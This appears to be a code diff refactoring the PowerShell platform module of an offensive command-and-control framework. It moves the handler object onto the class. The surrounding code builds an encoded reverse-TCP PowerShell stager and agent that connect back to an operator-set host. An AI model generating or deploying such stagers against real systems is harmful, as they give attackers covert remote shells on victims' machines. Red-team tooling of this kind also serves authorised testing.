@@ -23,7 +23,7 @@ class PlatformPowershell(Platform, ModuleBase):
     """
 
     # noinspection PyMissingConstructor
-    def __init__(self):
+    def __init__(self, handler):
         """
         powershell plattform code
         """
@@ -53,6 +53,7 @@ class PlatformPowershell(Platform, ModuleBase):
                 'Value'         :   "$TOOLPATH/data/syssspy.pem"
             }
         }
+        self.handler = handler
         self.platformpath = os.path.abspath(os.path.dirname(__file__))
         self.privatekey = None
         self.fingerprint = None
@@ -93,7 +94,8 @@ class PlatformPowershell(Platform, ModuleBase):
         else:
             return True
 
-    def _tryload_certificatefile(self, filename):
+    @staticmethod
+    def _tryload_certificatefile(filename):
         """
         try to load the certificate file
         """
@@ -177,9 +179,9 @@ class PlatformPowershell(Platform, ModuleBase):
         powershell platform can be staged by setting the option
         """
 
-        return (self.options['STAGED']['Value'] == "TRUE")
+        return self.options['STAGED']['Value'] == "TRUE"
 
-    def getstager(self, handler):
+    def getstager(self):
         """
         Generate the stager string
         """
@@ -187,17 +189,17 @@ class PlatformPowershell(Platform, ModuleBase):
         if not self.isstaged():
             print_error("Platform is not staged. Consider changing option STAGED or generating agent directly.")
             return None
-        if not handler.transport:
+        if not self.handler.transport:
             print_error("Transport not set")
             return None
 
         # generate powershell + reversetcp stager
-        if handler.options['TRANSPORT']['Value'] == "REVERSETCP":
-            ip = handler.transport.options['CONNECTHOST']['Value'] or handler.transport.options['LHOST']['Value']
+        if self.handler.options['TRANSPORT']['Value'] == "REVERSETCP":
+            ip = self.handler.transport.options['CONNECTHOST']['Value'] or self.handler.transport.options['LHOST']['Value']
             if ip == "0.0.0.0":
                 print_error("You should set a valid CONNECTHOST ip to connect to or change LHOST.")
                 return None
-            port = handler.transport.options['CONNECTPORT']['Value'] or handler.transport.options['LPORT']['Value']
+            port = self.handler.transport.options['CONNECTPORT']['Value'] or self.handler.transport.options['LPORT']['Value']
             print_debug(DEBUG_MODULE, "ip = {}, port = {}".format(ip, port))
             # TODO: Consider using helps.randomize_capitalization(...)
             stager = '$c=New-Object net.sockets.TcpClient("{}",{});'.format(ip,port)
@@ -245,7 +247,7 @@ class PlatformPowershell(Platform, ModuleBase):
             print_debug(DEBUG_MODULE, "stager = {}".format(stager))
             return helps.powershell_launcher(stager, baseCmd="powershell.exe -Enc ") # TODO: baseCmd
 
-        elif handler.options['TRANSPORT']['Value'] == "DNS":
+        elif self.handler.options['TRANSPORT']['Value'] == "DNS":
             # TODO: implement stager for Powershell and DNS here!
             return "NO STAGER"
 
@@ -254,7 +256,7 @@ class PlatformPowershell(Platform, ModuleBase):
             print_error("No stager for platform and transport found.")
             return None
 
-    def getagent(self, handler):
+    def getagent(self):
         """
         Generate the full powershell agent string for this setup if possible
         """
@@ -263,10 +265,10 @@ class PlatformPowershell(Platform, ModuleBase):
         agent = ""
 
         # add selected transport implementation
-        if handler.options['TRANSPORT']['Value'] == "REVERSETCP":
+        if self.handler.options['TRANSPORT']['Value'] == "REVERSETCP":
             f = open(self.platformpath + "/transport/reversetcp.ps1", 'r')
 
-        elif handler.options['TRANSPORT']['Value'] == "DNS":
+        elif self.handler.options['TRANSPORT']['Value'] == "DNS":
             # TODO: implement agent for Powershell and DNS here!
             return b"NO AGENT"
 
@@ -278,10 +280,10 @@ class PlatformPowershell(Platform, ModuleBase):
         f.close()
 
         # add selected channel encryption method
-        if handler.options['CHANNELENCRYPTION']['Value'] == "NONE":
+        if self.handler.options['CHANNELENCRYPTION']['Value'] == "NONE":
             pass # no encryption needed
 
-        elif handler.options['CHANNELENCRYPTION']['Value'] == "TLS":
+        elif self.handler.options['CHANNELENCRYPTION']['Value'] == "TLS":
             f = open(self.platformpath + "/transport/tls.ps1", 'r')
             agent += f.read()
             f.close()
@@ -305,19 +307,19 @@ class PlatformPowershell(Platform, ModuleBase):
         agent = helps.strip_powershell_comments(agent)
 
         # get and replace some values
-        if handler.options['TRANSPORT']['Value'] == "REVERSETCP":
-            ip = handler.transport.options['CONNECTHOST']['Value'] or handler.transport.options['LHOST']['Value']
+        if self.handler.options['TRANSPORT']['Value'] == "REVERSETCP":
+            ip = self.handler.transport.options['CONNECTHOST']['Value'] or self.handler.transport.options['LHOST']['Value']
             if ip == "0.0.0.0":
                 print_error("You should set a valid CONNECTHOST ip to connect to or change LHOST.")
                 return None
-            port = handler.transport.options['CONNECTPORT']['Value'] or handler.transport.options['LPORT']['Value']
+            port = self.handler.transport.options['CONNECTPORT']['Value'] or self.handler.transport.options['LPORT']['Value']
             print_debug(DEBUG_MODULE, "ip = {}, port = {}".format(ip, port))
 
             agent = agent.replace('SYREPLACE_CONNECTIONMETHOD', "REVERSETCP")
             agent = agent.replace('SYREPLACE_CONNECTHOST', str(ip))
             agent = agent.replace('SYREPLACE_CONNECTPORT', str(port))
 
-        elif handler.options['TRANSPORT']['Value'] == "DNS":
+        elif self.handler.options['TRANSPORT']['Value'] == "DNS":
             # TODO: implement agent for Powershell and DNS here!
             return b"NO AGENT"
 
@@ -327,7 +329,7 @@ class PlatformPowershell(Platform, ModuleBase):
             return None
 
         # replace channel encryption property
-        agent = agent.replace('SYREPLACE_CHANNELENCRYPTION', handler.options['CHANNELENCRYPTION']['Value'])
+        agent = agent.replace('SYREPLACE_CHANNELENCRYPTION', self.handler.options['CHANNELENCRYPTION']['Value'])
 
         # ok, lets encode the agent
         agent = agent.encode('utf-8')
@@ -366,4 +368,3 @@ class PlatformPowershell(Platform, ModuleBase):
         if len(agent) > MAX_AGENT_LEN and self.isstaged():
             print_error("agent is longer than stager buffer, staging will fail")
         return agent
-
